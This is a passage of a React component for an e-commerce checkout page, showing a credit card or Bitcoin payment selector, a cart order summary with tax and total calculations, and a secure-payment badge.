          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className={`lg:col-span-2 transition-all duration-700 delay-200 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
              <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm">
                <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
                  <Lock className="w-6 h-6 mr-3 text-blue-600" />
                  Payment Method
                </h2>
                
                <div className="space-y-4 mb-8">
                  <PaymentMethodCard
                    icon={<CreditCard className="h-6 w-6" />}
                    title="Credit Card"
                    description="Pay securely with Visa, Mastercard, or American Express"
                    isSelected={paymentMethod === 'credit-card'}
                    onClick={() => setPaymentMethod('credit-card')}
                    badge="Popular"
                  />
                  
                  <PaymentMethodCard
                    icon={<Bitcoin className="h-6 w-6" />}
                    title="Bitcoin"
                    description="Pay with cryptocurrency - fast and secure"
                    isSelected={paymentMethod === 'bitcoin'}
                    onClick={() => setPaymentMethod('bitcoin')}
                  />
                </div>

                <div className="transition-all duration-500">
                  {paymentMethod === 'credit-card' ? (
                    <CreditCardPayment totalAmount={getTotalPrice() * 1.08} />
                  ) : (
                    <BitcoinPayment totalAmount={getTotalPrice() * 1.08} />
                  )}
                </div>
              </Card>
            </div>

            <div className={`transition-all duration-700 delay-300 ${isLoaded ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-4'}`}>
              <Card className="p-8 shadow-xl border-0 rounded-3xl bg-white/80 backdrop-blur-sm sticky top-6">
                <h2 className="text-2xl font-bold mb-8 text-gray-900 flex items-center">
                  <Star className="w-6  mr-3 text-yellow-500" />
                  Order Summary
                </h2>

                <div className="space-y-6 mb-8">
                  {cart.map((item, index) => (
                    <div key={item.id} className={`flex items-start space-x-4 p-4 rounded-2xl bg-gray-50 transition-all duration-300 hover:bg-gray-100 animate-fade-in`} style={{animationDelay: `${index * 100}ms`}}>
                      <img
                        src={item.image}
                        alt={item.name}
                        className="w-16 h-16 object-cover rounded-xl shadow-md"
                      />
                      <div className="flex-1">
                        <p className="font-semibold text-gray-900 text-sm">{item.name}</p>
                        <p className="text-xs text-gray-500 mt-1">Quantity: {item.quantity}</p>
                        <p className="text-sm font-bold text-blue-600 mt-2">${item.price.toFixed(2)}</p>
                      </div>
                      <p className="text-lg font-bold text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
                    </div>
                  ))}
                </div>

                <div className="space-y-4 border-t border-gray-200 pt-6">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">Subtotal</span>
                    <span className="font-semibold text-gray-900">${getTotalPrice().toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 flex items-center">
                      <Truck className="w-4 h-4 mr-1" />
                      Shipping
                    </span>
                    <span className="font-semibold text-green-600">Free</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600">Tax (8%)</span>
                    <span className="font-semibold text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between items-center font-bold text-xl pt-4 border-t border-gray-200">
                    <span className="text-gray-900">Total</span>
                    <span className="text-blue-600">${(getTotalPrice() * 1.08).toFixed(2)}</span>
                  </div>
                </div>

                <div className="mt-8 p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-2xl border border-green-200">
                  <div className="flex items-center space-x-3">
                    <Shield className="h-5  text-green-600" />
                    <div>
                      <p className="text-sm font-semibold text-green-900">Secure Payment</p>
                      <p className="text-xs text-green-700">SSL encrypted & PCI compliant</p>
                    </div>
                  </div>
                </div>

                <div className="mt-6 text-xs text-gray-500 text-center">
                  <p>By placing your order, you agree to our <a href="#" className="text-blue-600 hover:underline font-medium">Terms of Service</a> and <a href="#" className="text-blue-600 hover:underline font-medium">Privacy Policy</a></p>
                </div>
              </Card>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CheckoutPage;